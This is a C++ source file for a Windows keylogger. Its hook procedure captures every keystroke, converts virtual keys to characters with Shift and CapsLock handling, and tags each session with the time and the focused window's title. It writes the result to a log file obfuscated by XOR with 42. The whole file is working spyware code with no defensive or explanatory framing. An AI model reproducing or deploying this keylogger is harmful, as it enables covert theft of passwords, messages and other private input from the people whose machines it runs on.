#include "KeyloggerProc.h"
#include <stdarg.h>

// return non-zero if the key pressed
static BOOL keyIsPressed(int vKey) {
    return (GetAsyncKeyState(vKey) & 0x8000) > 0;
}
// return true if a key is toggled (like CapsLock on)
static BOOL keyIsToggled(int vKey) {
    return GetKeyState(vKey) & 0x1;
}

// convert SystemTime to Unix time (in mili seconds)
static UINT64 systemTimeToMseconds(SYSTEMTIME& sysTime) {
    FILETIME cFileTime; //  the number of 100-nanosecond intervals
    if (!SystemTimeToFileTime(&sysTime, &cFileTime)) {
        return -1;
    }
    UINT64 mseconds = 0;
    memcpy(&mseconds, &cFileTime, sizeof(UINT64));
    mseconds /= 10000;

    return mseconds;
}

// return 1 if timeout, 0 if not and -1 if errors
static int sessionTimeout(SYSTEMTIME& sysTime) {
    UINT64 mseconds = systemTimeToMseconds(sysTime);
    if (lastSessionAt == 0 || (mseconds - lastSessionAt > sessionInterval)) {
        lastSessionAt = mseconds;
        return 1;
    }
    return 0;
}
// encrypt by xoring with number 42
void memfrob_like(char* buffer, size_t size) {
    if (buffer == NULL) {
        return;
    }
    for (int i = 0; i < size; ++i) {
        buffer[i] ^= 42;
    }
}

// write typing keystrokes to a file
// cases to end a session (1. focus window changed, 2. timeout)
void logKey(wchar_t const* format, ...) {
    va_list vl;
    SYSTEMTIME sysTime;
    HWND hWnd = NULL;
    GUITHREADINFO tInfo = {sizeof(tInfo)};
    wchar_t buffer[BUFSIZE] = {};
    wchar_t cTimeBuf[BUFSIZE] = {};
    wchar_t wTitleBuf[BUFSIZE] = {};
    
    if (GetGUIThreadInfo(NULL, &tInfo)) {
        hWnd = tInfo.hwndFocus;
    }

    // format [time][window-focus] keystrokes
    GetSystemTime(&sysTime);
    if (lastSessionAt == NULL) { 
        lastSessionAt = systemTimeToMseconds(sysTime);
    }

    if (lastHWnd == NULL || (hWnd != lastHWnd) || (sessionTimeout(sysTime))) {

        if (hWnd != NULL) {
            GetWindowText(hWnd, wTitleBuf, BUFSIZE);
        }
        int nwrite = GetDateFormatEx(LOCALE_NAME_SYSTEM_DEFAULT, NULL, &sysTime, NULL, cTimeBuf, BUFSIZE, NULL);
        cTimeBuf[nwrite - 1] = ' ';
        GetTimeFormatEx(LOCALE_NAME_SYSTEM_DEFAULT, NULL, &sysTime, NULL, &cTimeBuf[nwrite], BUFSIZE - nwrite);
        
        swprintf(buffer, BUFSIZE, L"\n[%s][%s] ", cTimeBuf, wTitleBuf);
        buffer[wcslen(buffer)] = L' ';
    }
    lastHWnd = hWnd;

    va_start(vl, format);
    vswprintf_s(buffer + wcslen(buffer), BUFSIZE - wcslen(buffer), format, vl);
    wprintf(buffer);
    
    DWORD nwrite = 0;
    char ansiBuf[BUFSIZE] = {};
    if (hLogFile != NULL){
        nwrite = WideCharToMultiByte(CP_UTF8, 0, buffer, wcslen(buffer), ansiBuf, BUFSIZE, NULL, NULL);
        memfrob_like(ansiBuf, nwrite);
        WriteFile(hLogFile, ansiBuf, nwrite, &nwrite, NULL);
        FlushFileBuffers(hLogFile);
    }
    va_end(vl);
}

int logKeyWrapper(int vkCode) {
    if (vkeyToChars.find(vkCode) != vkeyToChars.end()) {    // special chars
        logKey(L"[%s]", vkeyToChars.at(vkCode));
        return 0;
    }

    BOOL isCapsLock = keyIsToggled(VK_CAPITAL);
    BOOL isShift = keyIsPressed(VK_SHIFT);

    if (isShift && (shiftKeyToChars.find(vkCode) != shiftKeyToChars.end())) {    // Shift+convertable_key
        logKey(L"%s", shiftKeyToChars.at(vkCode));
        return 0;
    }

    // limitation: not taking into account the state of the SHIFT and CAPS LOCK keys (just individuals)
    // even does ToUnicode which takes the current virutal keystate
    wchar_t vkChar = MapVirtualKey(vkCode, MAPVK_VK_TO_CHAR);
    if (vkChar != 0) {
        if ((isCapsLock ^ isShift) == 0) {
            vkChar = tolower(vkChar);
        }
        logKey(L"%c", vkChar);
    }
    return 0; // non-zero values prevent from passing to the next in the chain or the target window proc
}

LRESULT CALLBACK keyloggerProc(
    int    code,
    WPARAM wParam,
    LPARAM lParam
) {
    DWORD vkCode = 0;
    if (code != 0 || lParam & 0x40000000) { // pressed action only
        return CallNextHookEx(NULL, code, wParam, lParam);
    }
    if (keyIsPressed(VK_MENU) || keyIsPressed(VK_CONTROL) || wParam == VK_SHIFT) {  // Alt/Ctrl + otherKey || Shift key
        return CallNextHookEx(NULL, code, wParam, lParam);
    }
    logKeyWrapper(wParam);
    return 0;   // non-zero values prevent from passing to the next in the chain or the target window proc
}